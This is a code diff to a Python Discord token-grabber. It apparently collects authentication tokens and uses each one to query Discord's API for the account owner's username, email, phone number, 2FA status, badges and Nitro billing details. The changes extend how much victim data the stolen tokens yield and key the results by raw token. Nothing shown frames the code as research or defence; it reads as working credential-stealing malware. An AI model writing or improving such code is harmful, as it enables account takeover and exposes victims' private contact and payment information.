@@ -89,10 +89,10 @@ def get_tokens() -> list[Any]:
         return goodTokens
     return find_tokens()
 
-def process_token(token: str):
+def process_token(token: str) -> dict[str, Any] | None:
     headers = {'Authorization': token, 'Content-Type': 'application/json'}
     try:
-        res = get('https://discordapp.com/api/v6/users/@me', headers=headers)
+        res = get('https://discord.com/api/v9/users/@me', headers=headers)
         if res.status_code == 200:
             res_json = res.json()
             user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
@@ -100,10 +100,37 @@ def process_token(token: str):
             email = res_json.get('email', None)
             phone = res_json.get('phone', None)
             mfa_enabled = res_json['mfa_enabled']
+            avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{res_json['avatar']}.png" if res_json.get('avatar') else None
+            flags = res_json.get('public_flags', 0)
+            badges = []
             
-            res = get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
-            nitro_data = res.json()
-            has_nitro = bool(len(nitro_data) > 0)
+            if flags & 1:
+                badges.append("Staff")
+            if flags & 2:
+                badges.append("Partner")
+            if flags & 4:
+                badges.append("Hypesquad")
+            if flags & 8:
+                badges.append("Bug Hunter")
+            if flags & 64:
+                badges.append("Early Supporter")
+
+            nitro_data_res = get('https://discord.com/api/v9/users/@me/billing/subscriptions', headers=headers)
+            nitro_data = nitro_data_res.json()
+            nitro_details = {}
+
+            if nitro_data:
+                has_nitro = True
+                nitro_details = {
+                    "type": nitro_data[0]["plan_type"],  # Nitro type (e.g., "Nitro", "Nitro Classic")
+                    "premium_since": nitro_data[0]["current_period_start"].split('.')[0]
+                }
+                end_date = nitro_data[0]["current_period_end"].split('.')[0]
+                d1 = datetime.datetime.strptime(end_date, "%Y-%m-%dT%H:%M:%S")
+                days_left = (d1 - datetime.datetime.now()).days
+                nitro_details["days_left"] = days_left
+            else:
+                has_nitro = False
 
             infos = {
                 "username": user_name,
@@ -111,19 +138,16 @@ def process_token(token: str):
                 "email": email,
                 "phone": phone,
                 "twofa": mfa_enabled,
-                "hasnitro": has_nitro
+                "avatar_url": avatar_url,
+                "badges": badges,
+                "hasnitro": has_nitro,
+                "nitro_details": nitro_details
             }
-            
-            if has_nitro:
-                d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
-                d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
-                days_left = abs((d1 - d2).days)
-                infos["days_left"] = days_left
 
             return infos
 
     except Exception as e:
-        pass
+        return None
     
     return None
 
@@ -134,15 +158,13 @@ def get_common_infos(tokens: list[str]):
     if len(tokens) == 1:
         infos = process_token(tokens[0])
     else:
-        infos_list = []
+        infos_dict = {}
         already_checked = set()
 
         for token in tokens:
             if token not in already_checked:
                 already_checked.add(token)
                 infos = process_token(token)
+                infos_dict[token] = infos
             
-                if infos:
-                    infos_list.append(infos)
-        
-        return infos_list
+        return infos_dict
